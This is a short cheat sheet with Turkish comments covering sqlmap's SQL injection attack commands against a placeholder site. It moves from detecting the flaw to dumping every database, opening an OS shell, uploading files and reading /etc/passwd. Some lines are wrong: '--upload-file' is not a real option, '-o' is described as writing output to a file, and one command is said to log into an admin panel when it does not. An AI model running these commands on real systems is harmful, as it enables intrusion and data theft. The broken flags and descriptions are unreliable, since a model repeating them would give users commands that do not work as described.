# Basit bir URL üzerinde SQL injection tespiti yap
sqlmap -u "http://example.com/page?id=1" --batch

# Kullanıcı adı ve şifre gerektiren bir site üzerinde SQL injection tespiti yap
sqlmap -u "http://example.com/login.php?user=admin&pass=test" --batch

# Form verisi üzerinden SQL injection tespiti yap
sqlmap -u "http://example.com/login.php" --data "username=admin&password=123" --batch

# HTTPS URL üzerinde SQL injection tespiti yap
sqlmap -u "https://example.com/page?id=1" --batch

#### Vuln check
# Belirtilen URL'de tüm parametrelerde SQL injection zafiyetini tespit et
sqlmap -u "http://example.com/page?id=1" --crawl=3 --batch

# Başka bir parametreyi de test et
sqlmap -u "http://example.com/search.php?q=test" --batch

# HTTP başlıklarını gözlemleyerek hedefi test et
sqlmap -u "http://example.com/page?id=1" -H "User-Agent: Mozilla/5.0" --batch

# Siteyi dasha derin tarayarak parametreleri keşfet
sqlmap -u "http://example.com/page?id=1" --crawl=5 --batch


#### Database / Table check
# Hedefin veritabanlarını listele
sqlmap -u "http://example.com/page?id=1" --dbs --batch

# Belirli bir veritabanındaki tabloları listele
sqlmap -u "http://example.com/page?id=1" -D target_db --tables --batch

# Belirli bir tablodaki verileri listele
sqlmap -u "http://example.com/page?id=1" -D target_db -T target_table --dump --batch


#### Data dump
# Hedef veritabanındaki tüm verileri dışa aktar
sqlmap -u "http://example.com/page?id=1" --dump --batch

# Sadece belirli bir tablodan veri çek
sqlmap -u "http://example.com/page?id=1" -D target_db -T target_table --dump --batch

# Veritabanını bir dosyaya dışa aktar
sqlmap -u "http://example.com/page?id=1" --dump-all --batch -o output.txt


#### Advanced SQLMAP USING
# SQLMap'ı farklı bir proxy üzerinden çalıştır (örneğin burp suite)
sqlmap -u "http://example.com/page?id=1" --proxy "http://localhost:8080" --batch

# Hedef veritabanı için alternatif bir payload kullan
sqlmap -u "http://example.com/page?id=1" --tamper="between" --batch

# Hedef siteyi login kullanarak test et
sqlmap -u "http://example.com" --cookie="SESSIONID=abcd1234" --batch

# Siteyi SQLMap ile taradıktan sonra zafiyetten yararlanarak admin paneline giriş yap
sqlmap -u "http://example.com/login.php?user=admin&pass=test" --data "username=admin&password=123" --batch --threads=10

# Veritabanına bir bağlantı açmak için --os-shell ve --os-pwn kullan
sqlmap -u "http://example.com/page?id=1" --os-shell --batch
sqlmap -u "http://example.com/page?id=1" --os-pwn --batch

# Hedef veritabanındaki tabloyu ve verilerini elde et
sqlmap -u "http://example.com/page?id=1" -D target_db -T target_table --dump --batch

# Hedef sisteme bir dosya yükle
sqlmap -u "http://example.com/page?id=1" --os-pwn --upload-file="/path/to/local/file" --batch

# Tüm veritabanlarını dışa aktar
sqlmap -u "http://example.com/page?id=1" --dump-all --batch

# Dizin geziyorum ve dosya okuma işlemi yapıyorum
sqlmap -u "http://example.com/page?id=1" --file-read="/etc/passwd" --batch
